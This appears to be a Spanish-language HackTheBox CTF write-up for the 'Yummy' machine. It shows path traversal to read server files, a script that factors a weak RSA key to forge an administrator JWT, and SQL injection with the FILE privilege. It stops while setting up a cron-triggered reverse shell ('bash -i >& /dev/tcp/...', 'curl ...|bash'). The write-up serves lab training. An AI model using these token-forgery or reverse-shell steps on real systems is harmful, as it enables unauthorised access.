---
layout: post
title:  "Writeup Yummy"
date:   2025-04-19 
categories: [Writeup, HackTheBox]
image:
    path: /images/writeup-yummy/1.png
---

***Dificultad: Dificil***

***Sistema Operativo: Linux***


hoy estamos de vuelta con otra maquina difícil de hack the box, las cuales están enfocadas en entornos mas realistas.

--------------------

## Reconocimiento:

lo primero, será crear las carpetas de trabajo en mi directorio /htb
```bash
cd htb && mkdir yummy
cd yummy && mkdir content exploits nmap
```
luego hacer el reconocimiento a la ip del servidor con nmap:
```bash
nmap -p- --open -n -sS -Pn -vvv --min-rate 5999 10.10.10.10 
```

```bash
nmap -p- --open -sS -Pn -n -vvv --min-rate 5999 10.129.231.153
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-12 10:46 CEST
Initiating SYN Stealth Scan at 10:46
Scanning 10.129.231.153 [65535 ports]
Discovered open port 22/tcp on 10.129.231.153
Discovered open port 80/tcp on 10.129.231.153
Completed SYN Stealth Scan at 10:46, 13.44s elapsed (65535 total ports)
Nmap scan report for 10.129.231.153
Host is up, received user-set (0.038s latency).
Scanned at 2025-04-12 10:46:24 CEST for 13s
Not shown: 64464 closed tcp ports (reset), 1069 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds
           Raw packets sent: 82010 (3.608MB) | Rcvd: 68960 (2.758MB)

```

podemos confirmar que por el ttl que es una maquina linux, además de que hay 2 puertos siendo usados en el servidor, vamos a capturar banners y ver que versiones y servicios están corriendo:
```bash
nmap -p22,80 -sCV -n -vvv 10.10.10.10
```

```c
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNb9gG2HwsjMe4EUwFdFE9H8NguzJkfCboW4CveSS+cr2846RitFyzx3a9t4X7S3xE3OgLnmgj8PtKCcOnVh8nQ=
|   256 bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZKWYurAF2kFS4bHCSCBvsQ+55/NxhAtZGCykcOx9b6
80/tcp open  http    syn-ack ttl 63 Caddy httpd
|_http-title: Did not follow redirect to http://yummy.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Caddy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

vemos lo clásico que nos encontramos en las maquinas, con lo que podemos quedarnos seria: el nombre del host (yummy.htb), la tecnología que esta corriendo el servidor (Caddy) y los métodos que acepta (GET - HEAD - POST - OPTIONS)

voy a agregar este nombre de dominio a mi /etc/hosts para poder buscar mas información del mismo, ya sabemos que las maquina de htb o algunos entornos trabajan con virtual hosting:
```bash
echo "10.10.10.10    yummy.htb" >> /etc/hosts #cuidado con los permisos de escritura
```

teniendo esto, podemos acercarnos a la pagina para averiguar mas, pero primero lo hare desde la terminal:
```bash
whatweb http://yummy.htb
```
<img src="/images/writeup-yummy/Pasted image 20250412110701.png" alt="image">

nada mas allá de lo que ya se ha descubierto, así que vamos al navegador:
<img src="/images/writeup-yummy/Pasted image 20250412110937.png" alt="image" >
veo que es la web de un restaurante, voy a empezar a explorar las funcionalidades.

tenemos un formulario para reservar mesas:
<img src="/images/writeup-yummy/Pasted image 20250412111125.png" alt="image">

un panel de inicio de sesión:
<img src="/images/writeup-yummy/Pasted image 20250412111203.png" alt="image">

*que tambien podemos registrarnos*

tambien hay un formulario de contacto y otro de suscripción a newsletter:
<img src="/images/writeup-yummy/Pasted image 20250412114225.png" alt="image">

probando varias cosillas en estos formularios, no tenemos nada especial, voy a registrarme y dentro del dashboard podemos ver:
<img src="/images/writeup-yummy/Pasted image 20250412114546.png" alt="image">

es como un registro de reservaciones, lo que me hace pensar que puede ser la ruta para vulnerar la web, así que vamos a tomar una reservación y seguir:
<img src="/images/writeup-yummy/Pasted image 20250412115046.png" alt="image">

iré a mi cuenta, y veo que tenemos 2 botones de acción, además de que se refleja el mensaje, podemos intentar hacer que el servidor almacene algún payload cargado desde la reservación, pero primero quiero probar lo mas evidente (los botones de acción)

<img src="/images/writeup-yummy/Pasted image 20250412115518.png" alt="image">

con este, veo que hay un redireccionamiento junto con el numero del id de la reservación:


<img src="/images/writeup-yummy/Pasted image 20250412115621.png" alt="image">

pulsar el botón, quiero intentar visitar /reminder:

<img src="/images/writeup-yummy/Pasted image 20250412115841.png" alt="image">

y si coloco el numero de la reservación:
<img src="/images/writeup-yummy/Pasted image 20250412115927.png" alt="image">

descarga el .ics o  el archivo icalendar sin haber pulsado el botón, ahora, si intento visitar otros números de reserva:
<img src="/images/writeup-yummy/Pasted image 20250412120058.png" alt="image">

veo un mensaje de que la reserva no existe, además de que dice que mi reserva anterior fue descargada con éxito y en mi dashboard ya no muestra la reservación

se esta descargando un archivo temporal (la reserva) lo cual cuando se hace, deja de estar en el servidor, entonces, como nos podemos aprovechar de esto? podemos usarlo para descargar archivos arbitrarios del servidor? como? 

para eso debemos ver las peticiones en burpsuite y tratar de modificar cabeceras o parámetros y ver las respuestas del servidor, pero antes, vamos a analizar el archivo descargado (y así no dejaremos nada por fuera) 

primero vemos el contenido:
```bash
cat Yumm*
```
```ics
BEGIN:VCALENDAR
VERSION:2.0
PRODID:ics.py - http://git.io/lLljaA
BEGIN:VEVENT
DESCRIPTION:Email: 3vilsec@htb.com\nNumber of People: 3\nMessage: this is a test
DTSTART:20250512T000000Z
SUMMARY:3vilsec
UID:b8352f90-3b75-409e-98f4-d27983cfdfa1@b835.org
END:VEVENT
END:VCALENDAR 
```

podemos ver tambien los metadatos, en busca de información relevante:
```bash
exiftool Yummy*
```
```exiftool
ExifTool Version Number         : 13.10
File Name                       : Yummy_reservation_20250412_095927.ics
Directory                       : .
File Size                       : 283 bytes
File Modification Date/Time     : 2025:04:12 11:58:48+02:00
File Access Date/Time           : 2025:04:12 12:19:33+02:00
File Inode Change Date/Time     : 2025:04:12 11:58:48+02:00
File Permissions                : -rw-rw-r--
File Type                       : ICS
File Type Extension             : ics
MIME Type                       : text/calendar
VCalendar Version               : 2.0
Software                        : ics.py - http://git.io/lLljaA
Description                     : Email: 3vilsec@htb.com.Number of People: 3.Message: this is a test
Date Time Start                 : 2025:05:12 00:00:00Z
Summary                         : 3vilsec
UID                             : b8352f90-3b75-409e-98f4-d27983cfdfa1@b835.org
```
bueno, no veo nada de lo que aprovecharme, vamos con burpsuite

lo que hare, sera crear una nueva reservación y descargar el archivo nuevamente para leer el historial de peticiones y probar cosas desde el repeater

viendo las solicitudes, hay 3 cosas que han llamado mi atención:
1) tenemos una cookie, que esta codificada en base64
2) la solicitud /remainder que es la de descarga, asigna un cookie adicional temporal y hace un redireccionamiento  a /export/datos.ics que es la respuesta del servidor con los datos que serán descargados
3) esa solicitud /export hace uso de esa cookie temporal + la cookie de sesión para solicitarle al servidor la data


jwt.io nos da información relevante sobre el mismo, si haz trabajado jwt antes, veras que contiene su firma, rol, email, algoritmo, etc:
<img src="/images/writeup-yummy/Pasted image 20250412131822.png" alt="image">
lo que nos hace pensar que podríamos intentar modificarlo, pero primero debemos encontrar las claves


solicitud /reminder la cual asigna la cookie temporal y además nos da el redireccionamiento que hará que se descarguen los datos:
<img src="/images/writeup-yummy/Pasted image 20250412131939.png" alt="image">

y esta ya es la solicitud al servidor con orden de descarga, el cual nos responde con los datos solicitados:
<img src="/images/writeup-yummy/Pasted image 20250412132200.png" alt="image">

voy a enviar estas ultimas al repeater, para intentar leer archivos arbitrarios en el servidor #LocalFileInclusion

aunque sospecho que si se crea esa "cookie" temporal, no se podrá hacer desde el /export, aun así lo intentare, pero lo haré desde /reminder primero

aunque ninguno de los 2 da resultado (me lo imaginaba), dado que la funcionalidad de reminder no puedo acceder por mi cuenta, y el otro me redirecciona al /dashboard por la cookie temporal

lo que pienso es que podría capturar la solicitud y modificarlas antes de que vayan al servidor, aprovechando una nueva reserva

***<u>al parecer, tambien después de un tiempo se elimina mi cuenta y debo volver a registrarme haha</u>***


bueno, al interceptar las solicitudes, intente modificar el /reminder con un directory listing basico. pero la me arrojó un error 404:
<img src="/images/writeup-yummy/Pasted image 20250412133909.png" alt="image">

así que deje pasar esta solicitud por el proxy y llego la siguiente:
<img src="/images/writeup-yummy/Pasted image 20250412134023.png" alt="image">

la cual tambien modifique con un ../../../../../../etc/passwd y no de daba error, ni hacia nada (no veía respuesta del servidor) pero la reservación seguía allí (lo cual no pasa) 

asi que voy al historial http del burpsuite y extranamente, aunque cambie alli, se sigue viendo asi:
<img src="/images/writeup-yummy/Pasted image 20250412134634.png" alt="image">

de hecho, hasta me da un internal server error, así que decidí enviar esta solicitud al repeater, tambien me dio error tanto en el nombre como si lo modifico (ambas solicitudes deben ir casi simultaneo) entonces si mientras la intercepto, lo envió al repeater? 

<img src="/images/writeup-yummy/Pasted image 20250412135227.png" alt="image">
este no lo permite, dice que no se encuentra asi que lo intento enviar integro


follow redirect:
<img src="/images/writeup-yummy/Pasted image 20250412135925.png" alt="image">
<img src="/images/writeup-yummy/Pasted image 20250412135945.png" alt="image">

aquí, solo me faltaba intentar enviar al repeater el redirect justo antes que lo enviara al servidor (porque el follow redirect no me lo permitía porque como vemos es una cookie de un solo uso)


el el proxy dejo pasar la primera solicitud y la segunda la envío al repeater, modifico el path con ../../../../../../etc/passwd:
<img src="/images/writeup-yummy/Pasted image 20250412140325.png" alt="image">

tenemos directory listing, el cual se vale de una cookie de 1 solo uso

mirando el dashboard, indica que se ha descargado, pero la reservación sigue allí

después de estas buscando un montón entre los archivos del sistema, e encontrado varios importantes:

las tareas cron, están ejecutando 3 scripts:
<img src="/images/writeup-yummy/Pasted image 20250412225347.png" alt="image">
<img src="/images/writeup-yummy/Pasted image 20250412225359.png" alt="image">

table_cleanup.sh:
```bash
#!/bin/sh

/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql

```

dbmonitor.sh:
```bash
#!/bin/bash

timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)

if [ "$response" != 'active' ]; then
    /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi

[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
```

app_backup.sh:
```bash
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app
```

tirando un poco del hilo, intento descargar backupapp.zip tambien:
<img src="/images/writeup-yummy/Pasted image 20250412232657.png" alt="image">

click derecho y:

<img src="/images/writeup-yummy/Pasted image 20250412232808.png" alt="image">

lo que nos va a descargar el archivo a nuestra maquina:
<img src="/images/writeup-yummy/Pasted image 20250412232900.png" alt="image">

investiguemos primero este (que se ve interesante), y luego analizamos los otros archivos:
```bash
unzip backupapp.zip
```
vemos que tenemos la aplicación entera:
<img src="/images/writeup-yummy/Pasted image 20250412233325.png" alt="image">

traeré al writeup el código con:
```bash
cat app.py | xclip -sel clip
```
```python
from flask import Flask, request, send_file, render_template, redirect, url_for, flash, jsonify, make_response
import tempfile
import os
import shutil
from datetime import datetime, timedelta, timezone
from urllib.parse import quote
from ics import Calendar, Event
from middleware.verification import verify_token
from config import signature
import pymysql.cursors
from pymysql.constants import CLIENT
import jwt
import secrets
import hashlib

app = Flask(__name__, static_url_path='/static')
temp_dir = ''
app.secret_key = secrets.token_hex(32)

db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS

}

access_token = ''

@app.route('/login', methods=['GET','POST'])
def login():
    global access_token
    if request.method == 'GET':
        return render_template('login.html', message=None)
    elif request.method == 'POST':
        email = request.json.get('email')
        password = request.json.get('password')
        password2 = hashlib.sha256(password.encode()).hexdigest()
        if not email or not password:
            return jsonify(message="email or password is missing"), 400

        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
                cursor.execute(sql, (email, password2))
                user = cursor.fetchone()
                if user:
                    payload = {
                        'email': email,
                        'role': user['role_id'],
                        'iat': datetime.now(timezone.utc),
                        'exp': datetime.now(timezone.utc) + timedelta(seconds=3600),
                        'jwk':{'kty': 'RSA',"n":str(signature.n),"e":signature.e}
                    }
                    access_token = jwt.encode(payload, signature.key.export_key(), algorithm='RS256')

                    response = make_response(jsonify(access_token=access_token), 200)
                    response.set_cookie('X-AUTH-Token', access_token)
                    return response
                else:
                    return jsonify(message="Invalid email or password"), 401
        finally:
            connection.close()

@app.route('/logout', methods=['GET'])
def logout():
    response = make_response(redirect('/login'))
    response.set_cookie('X-AUTH-Token', '')
    return response

@app.route('/register', methods=['GET', 'POST'])
def register():
        if request.method == 'GET':
            return render_template('register.html', message=None)
        elif request.method == 'POST':
            role_id = 'customer_' + secrets.token_hex(4)
            email = request.json.get('email')
            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
            if not email or not password:
                return jsonify(error="email or password is missing"), 400
            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "SELECT * FROM users WHERE email=%s"
                    cursor.execute(sql, (email,))
                    existing_user = cursor.fetchone()
                    if existing_user:
                        return jsonify(error="Email already exists"), 400
                    else:
                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
                        cursor.execute(sql, (email, password, role_id))
                        connection.commit()
                        return jsonify(message="User registered successfully"), 201
            finally:
                connection.close()


@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template('index.html')

@app.route('/book', methods=['GET', 'POST'])
def export():
    if request.method == 'POST':
        try:
            name = request.form['name']
            date = request.form['date']
            time = request.form['time']
            email = request.form['email']
            num_people = request.form['people']
            message = request.form['message']

            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "INSERT INTO appointments (appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message, role_id) VALUES (%s, %s, %s, %s, %s, %s, %s)"
                    cursor.execute(sql, (name, email, date, time, num_people, message, 'customer'))
                    connection.commit()
                    flash('Your booking request was sent. You can manage your appointment further from your account. Thank you!', 'success')  
            except Exception as e:
                print(e)
            return redirect('/#book-a-table')
        except ValueError:
            flash('Error processing your request. Please try again.', 'error')
    return render_template('index.html')


def generate_ics_file(name, date, time, email, num_people, message):
    global temp_dir
    temp_dir = tempfile.mkdtemp()
    current_date_time = datetime.now()
    formatted_date_time = current_date_time.strftime("%Y%m%d_%H%M%S")

    cal = Calendar()
    event = Event()
    
    event.name = name
    event.begin = datetime.strptime(date, "%Y-%m-%d")
    event.description = f"Email: {email}\nNumber of People: {num_people}\nMessage: {message}"
    
    cal.events.add(event)

    temp_file_path = os.path.join(temp_dir, quote('Yummy_reservation_' + formatted_date_time + '.ics'))
    with open(temp_file_path, 'w') as fp:
        fp.write(cal.serialize())

    return os.path.basename(temp_file_path)

@app.route('/export/<path:filename>')
def export_file(filename):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))
    filepath = os.path.join(temp_dir, filename)
    if os.path.exists(filepath):
        content = send_file(filepath, as_attachment=True)
        shutil.rmtree(temp_dir)
        return content
    else:
        shutil.rmtree(temp_dir)
        return "File not found", 404

def validate_login():
    try:
        (email, current_role), status_code = verify_token()
        if email and status_code == 200 and current_role == "administrator":
            return current_role
        elif email and status_code == 200:
            return email
        else:
            raise Exception("Invalid token")
    except Exception as e:
        return None


@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
        validation = validate_login()
        if validation is None:
            return redirect(url_for('login'))
        elif validation == "administrator":
            return redirect(url_for('admindashboard'))
 
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
                cursor.execute(sql, (validation,))
                connection.commit()
                appointments = cursor.fetchall()
                appointments_sorted = sorted(appointments, key=lambda x: x['appointment_id'])

        finally:
            connection.close()

        return render_template('dashboard.html', appointments=appointments_sorted)

@app.route('/delete/<appointID>')
def delete_file(appointID):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))
    elif validation == "administrator":
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "DELETE FROM appointments where appointment_id= %s;"
                cursor.execute(sql, (appointID,))
                connection.commit()

                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()
        finally:
            connection.close()
            flash("Reservation deleted successfully","success")
            return redirect(url_for("admindashboard"))
    else:
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "DELETE FROM appointments WHERE appointment_id = %s AND appointment_email = %s;"
                cursor.execute(sql, (appointID, validation))
                connection.commit()

                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
                cursor.execute(sql, (validation,))
                connection.commit()
                appointments = cursor.fetchall()
        finally:
            connection.close()
            flash("Reservation deleted successfully","success")
            return redirect(url_for("dashboard"))
        flash("Something went wrong!","error")
        return redirect(url_for("dashboard"))

@app.route('/reminder/<appointID>')
def reminder_file(appointID):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))

    connection = pymysql.connect(**db_config)
    try:
        with connection.cursor() as cursor:
            sql = "SELECT appointment_id, appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s AND appointment_id = %s"
            result = cursor.execute(sql, (validation, appointID))
            if result != 0:
                connection.commit()
                appointments = cursor.fetchone()
                filename = generate_ics_file(appointments['appointment_name'], appointments['appointment_date'], appointments['appointment_time'], appointments['appointment_email'], appointments['appointment_people'], appointments['appointment_message'])
                connection.close()
                flash("Reservation downloaded successfully","success")
                return redirect(url_for('export_file', filename=filename))
            else:
                flash("Something went wrong!","error")
    except:
        flash("Something went wrong!","error")
        
    return redirect(url_for("dashboard"))

@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))
 
        try:
            connection = pymysql.connect(**db_config)
            with connection.cursor() as cursor:
                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()

                search_query = request.args.get('s', '')

                # added option to order the reservations
                order_query = request.args.get('o', '')

                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
                cursor.execute(sql, ('%' + search_query + '%',))
                connection.commit()
                appointments = cursor.fetchall()
            connection.close()
            
            return render_template('admindashboard.html', appointments=appointments)
        except Exception as e:
            flash(str(e), 'error')
            return render_template('admindashboard.html', appointments=appointments)



if __name__ == '__main__':
    app.run(threaded=True, debug=False, host='0.0.0.0', port=3000)

```


en este código tiene varios detalles interesantes:

hay un "validador", que si es igual a administrator nos llevara a un panel que tiene la pagina que no había visto:
```python
@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
        validation = validate_login()
        if validation is None:
            return redirect(url_for('login'))
        elif validation == "administrator":
            return redirect(url_for('admindashboard'))
            
##tenemos tambien indicios del panel administrativo mas abajo:

@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))
```

vemos que la validación se da en una funcion arriba de esta, la cual al parecer desglosa y analiza el jwt:
```python
def validate_login():
    try:
        (email, current_role), status_code = verify_token()
        if email and status_code == 200 and current_role == "administrator":
            return current_role
        elif email and status_code == 200:
            return email
        else:
            raise Exception("Invalid token")
    except Exception as e:
        return None
```
recordemos que al ver el contenido del token vimos "role" (ya podemos intuir como vamos a atacar)

debemos acceder a panel administrativo, pero como vemos en el código, si no tenemos un jwt con el rol administrativo, simplemente nos va a redirigir a el /login

aunque tambien tenemos el codigo fuente del admindashboard, no nos sirve de nada

ahora, debemos modificar nuestro jwt, como? necesitamos las claves rsa que se están usando para firmar los tokens

## Vulnerando el JWT:

podemos intentar probar algunas herramientas, pero tambien podríamos intentarlo de manera manual:

tenemos la ventaja de que tenemos la app entera en nuestra maquina, asi que vamos a buscar la librería que contiene la ***funcion verify_token()*** en opt/app/middleware/verification.py:
```python
#!/usr/bin/python3

from flask import request, jsonify
import jwt
from config import signature

def verify_token():
    token = None
    if "Cookie" in request.headers:
        try:
            token = request.headers["Cookie"].split(" ")[0].split("X-AUTH-Token=")[1].replace(";", '')
        except:
            return jsonify(message="Authentication Token is missing"), 401

    if not token:
        return jsonify(message="Authentication Token is missing"), 401

    try:
        data = jwt.decode(token, signature.public_key, algorithms=["RS256"])
        current_role = data.get("role")
        email = data.get("email")
        if current_role is None or ("customer" not in current_role and "administrator" not in current_role):
            return jsonify(message="Invalid Authentication token"), 401

        return (email, current_role), 200

    except jwt.ExpiredSignatureError:
        return jsonify(message="Token has expired"), 401
    except jwt.InvalidTokenError:
        return jsonify(message="Invalid token"), 401
    except Exception as e:
        return jsonify(error=str(e)), 500

```

vemos que la validacion de la firma la hace signature.public_key y signature esta siendo importado desde config, iremos ahora a opt/app/config/signature.py:
```python
#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy


# Generate RSA key pair
q = sympy.randprime(2**19, 2**20)
n = sympy.randprime(2**1023, 2**1024) * q
e = 65537
p = n // q
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()

private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()

```
y aquí tenemos como se están generando los pares de claves:

q = es un numero (2^19)=524,288 y (2^20) = 1,048.576 (aquí esta la vulnerabilidad)
p = un numero primo aleatorio entre 2^1022 y 2^1024 
n = es el valor que tenemos en el token nuemro primo random *q*
e = valor estatico 65537
p = n // q

investigando, todo me llevaba a que si la clave esta usando un primo pequeño, se puede factorizar *n*
y asi sacar el valor de q, para poder calcular la rsa (dado que ya tenemos n en el token)

lo primero entonces es calcular el valor de q con un script que va a dividir n entre todos los valores entre el rango que sabemos, y si da '0' sabremos que ese es el valor de q:

```python
import sympy

n = 167090849742406091701649657236574947690932761945057392479517424115635891629092964372208590415566807475406071972159511063835063932922113079405439015900684292833854222495081981789547819916456240743864131846738096707575663013818508345235858426604949900095398457461802738212987952489660484482454429414378104794468733693
e = 65537

for q in sympy.primerange(2**19, 2**20):
    if n % q == 0:
        print(f"Este es q: {q}")
        p = n // q
        print(f"p: {p}")
        break
                 
```
es un bucle simple y *q*=967459 (tambien puedes factorizar 'n' en https://factordb.com)

ahora con estos datos, podemos generar las claves y el token, de nuevo con ayuda de nuestro llm fav, (cuidado, porque falla un montón **analiza el código con calma** ):
```python
from Crypto.PublicKey import RSA
import jwt

q = 967459
n = 167090849742406091701649657236574947690932761945057392479517424115635891629092964372208590415566807475406071972159511063835063932922113079405439015900684292833854222495081981789547819916456240743864131846738096707575663013818508345235858426604949900095398457461802738212987952489660484482454429414378104794468733693
e = 65537
p = n // q
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)

private_key = RSA.construct((n, e, d, p, q))
private_key_pem = private_key.export_key()

payload = {
    "email": "3vilsec@htb.com",
    "role": "administrator",
    "iat": 1744736900,
    "exp": 1744740500,
    "jwk": {
        "kty": "RSA",
        "n": str(n),
        "e": 65537
    }
}

new_token = jwt.encode(payload, private_key_pem, algorithm="RS256")
print(new_token)

```
así queda después de arreglar algunas cosas, y usando la base del mismo código que usa la pagina

```
pyton3 token_gen.py
```
<img src="/images/writeup-yummy/Pasted image 20250415194714.png" alt="image">


***Nota: si tienes problemas con las dependencias o bibliotecas que se usan, entra a un entorno de desarrollo de python y descarga lo que necesites (pycryptodome - cryptography )
para en entorno:
```bash
sudo apt install python3-venv

python3 -m venv entorno

source entorno/bin/activate
```


con esto, vamos a ir al navegador y a meter nuestro token nuevo en el storage:
<img src="/images/writeup-yummy/Pasted image 20250415194953.png" alt="image">

intentamos cargar el dashboard que ya conocemos:
<img src="/images/writeup-yummy/Pasted image 20250415195032.png" alt="image">
ha funcionado

ahora, si a futuro quieres evitar esto para ir mas rápido, puedes usar:
https://github.com/RsaCtfTool/RsaCtfTool

```bash
RsaCtfTool -n "colocamos el valor de n" -e "colocamos el valor de e" --private
```
<img src="/images/writeup-yummy/Pasted image 20250415201801.png" alt="image">

nos da la calve privada lo podemos guardar en un archivo .pem

teniendo el archivo simplemente vamos a usar un generador muy parecido al que usamos antes:
```bash
import jwt

with open("key.pem", "rb") as f:
    private_key = f.read()

payload = {
    "email": "3vilsec@htb.com",
    "role": "administrator",
    "iat": 1744736900,
    "exp": 1744740500,
    "jwk": {
        "kty": "RSA",
        "n": "167090849742406091701649657236574947690932761945057392479517424115635891629092964372208590415566807475406071972159511063835063932922113079405439015900684292833854222495081981789547819916456240743864131846738096707575663013818508345235858426604949900095398457461802738212987952489660484482454429414378104794468733693",
        "e": 65537
    }
}


new_token = jwt.encode(payload, private_key, algorithm="RS256")
print(new_token)
```

hay varios métodos mas, pero estos son los que he usado, (no vamos a profundizar en jwt atacks porque de eso no va este writeup)

## inyección SQL:

ahora, leyendo un poco el codigo de la pagina admin y como se hacen las consultas, encontramos que 'o' es vulnerable a sqlinjection, asi que, si probamos esto:

<img src="/images/writeup-yummy/Pasted image 20250416174125.png" alt="image">
ahora, veremos que tenemos allí

después de probar varios payloads manuales, decidí probar la url con SQLmap:
<img src="/images/writeup-yummy/Pasted image 20250418100116.png" alt="image">
error-based / stacked queries(varias consultas concatenadas) / time-based blind

tambien vemos que nos da información del usuario que esta ejecutando las querys de la base de datos:
```
[10:17:39] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[10:17:39] [INFO] fetching current user
[10:17:40] [INFO] retrieved: 'chef@localhost'
current user: 'chef@localhost'
```

al usar el comando --privilege nos muestra que es "*FILE*":
<img src="/images/writeup-yummy/Pasted image 20250418103716.png" alt="image">

esto es un hallazgo critico, dado que nos permite leer y escribir archivos en la base de datos y fuera de ella, lo que nos puede llevar a leer archivos del sistema o meter un payload malicioso para ejecutar una reverse shell :D

porque recordemos que este privilegio nos va a permitir funciones como *load data infile* o *select into outfile*


y volví a mirar el código fuente específicamente en el dbmonitor.sh (que es ejecutado por el usuario mysql)encontrado en las tareas cron del sistema ,entonces en el script podemos confirmar que:

 - este script verifica el estado de la base de datos y si no esta activa se crea un archivo dbstatus.json donde debe estar un string "the database is down", que servirá para cuando se valide si esta activa con un bucle 
 - si la base de datos esta activa comprueba al existencia de dbstatus.json y si contiene "database is down", notifica que estuvo caída la base de datos, elimina el archivo y no ejecuta el fixer-v*
 - ahora, si el archivo dbstatus.json existe pero no tiene ese string "database is down", asume que fallo la restauración, elimina el archivo pero esta vez si ejecutara el fixer-v"algo" 


lo que vemos en el código, es que al verificar que la base de datos esta activa, no debería crearse un dbstatus.json entonces al estar activa, existir un archivo dbstatus.json y además ese archivo no contener la cadena de texto "database is down" va a buscar fixer-v"algo" y lo va a ejecutar y allí es donde vamos a escribir nuestro archivo malicioso

## Shell como SQL:

así que debemos escribir 2 archivos: 
```
fixer-v*
dbstatus.json (pero sin la cadena "database is down")
```

vamos a crear los archivos necesarios en nuestra carpeta de trabajo:
```bash
echo "bash -i >& /dev/tcp/10.10.10.10/9999 0>&1" > 3vilsec.sh
echo "3vilsec is here" > dbstatus.json
echo "curl 10.10.10.10/3vilsec.sh|bash" > fixer-v666
```

con los archivos vamos en otra pestana a levantar un servidor python y a poner a netcat en escucha:
```bash
nc -lvnp 9999
python3 -m http.server 80
```

y para la escritura, vamos la usar sqlmap:
```bash
